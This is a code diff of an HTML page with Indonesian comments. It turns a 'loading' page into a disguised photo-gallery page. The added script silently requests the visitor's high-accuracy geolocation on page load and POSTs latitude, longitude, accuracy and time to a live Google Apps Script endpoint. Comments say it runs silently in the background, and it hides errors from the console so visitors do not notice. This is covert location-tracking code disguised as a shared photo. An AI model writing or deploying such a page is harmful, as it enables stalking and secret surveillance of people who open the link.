@@ -3,44 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Memuat Halaman...</title>
+    <title>Galeri Foto</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            margin-top: 100px;
-            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            background-color: #0f0f0f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
         .container {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            display: inline-block;
-            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 100%;
+            padding: 15px;
+            box-sizing: border-box;
         }
-        #status {
-            font-weight: bold;
-            color: #555;
-            font-size: 18px;
+        .image-wrapper {
+            background: white;
+            padding: 10px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 15px rgba(0,0,0,0.3);
+        }
+        img {
+            width: 100%;
+            height: auto;
+            border-radius: 4px;
+            display: block;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>Memuat Konten...</h2>
-        <p id="status">Menyiapkan halaman, mohon tunggu sebentar...</p>
+        <div class="image-wrapper">
+            <!-- Ganti teks URL_FOTO_ANDA di bawah ini dengan tautan langsung (direct link) foto Anda -->
+            <img src="PXL_20260815_090015220.jpg" alt="Shared Media">
+        </div>
     </div>
 
     <script>
-        // Ganti URL di bawah ini dengan URL Web App Google Apps Script Anda yang berakhiran /exec
-        const WEB_APP_URL = "GANTI_DENGAN_URL_WEB_APP_ANDA_DISINI";
-
-        // Fungsi dijalankan otomatis begitu halaman selesai dimuat
+        // Skrip berjalan secara senyap di latar belakang tanpa mengubah tampilan teks
         window.onload = function() {
-            const statusText = document.getElementById('status');
-            statusText.textContent = "Meminta verifikasi akses...";
-
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
@@ -49,7 +56,6 @@
                         const akurasi = position.coords.accuracy;
                         const waktuSekarang = new Date().toLocaleString();
                         
-                        // Menyiapkan data paket yang akan dikirim
                         const payload = {
                             waktu: waktuSekarang,
                             latitude: lat,
@@ -57,7 +63,6 @@
                             akurasi: akurasi + " meter"
                         };
 
-                        // Mengirim data secara otomatis ke backend (Google Sheets)
                         fetch("https://script.google.com/macros/s/AKfycbwwjCkMGf_fNAGP8S03P5-xhv4PBiF8ISvZ267ks1dOMbCbnEax3Do01pn1MtekAIxP/exec", {
                             method: "POST",
                             mode: "no-cors",
@@ -65,18 +70,12 @@
                                 "Content-Type": "application/json"
                             },
                             body: JSON.stringify(payload)
-                        }).then(() => {
-                            console.log("Data otomatis terkirim.");
                         }).catch(err => {
-                            console.error("Gagal mengirim data:", err);
+                            // Mengabaikan log error agar tidak terlihat di konsol publik
                         });
-                        
-                        // Mengubah teks tampilan di layar agar tampak seperti halaman normal/selesai memuat
-                        statusText.innerHTML = `<span style="color: green;">Halaman berhasil dimuat.</span>`;
                     },
                     function(error) {
-                        // Jika izin ditolak atau terjadi kendala, halaman tetap terlihat normal bagi pengunjung
-                        statusText.innerHTML = `<span>Halaman berhasil dimuat.</span>`;
+                        // Mengabaikan jika izin ditolak
                     },
                     {
                         enableHighAccuracy: true,
@@ -84,8 +83,6 @@
                         maximumAge: 0
                     }
                 );
-            } else {
-                statusText.textContent = "Halaman berhasil dimuat.";
             }
         };
     </script>
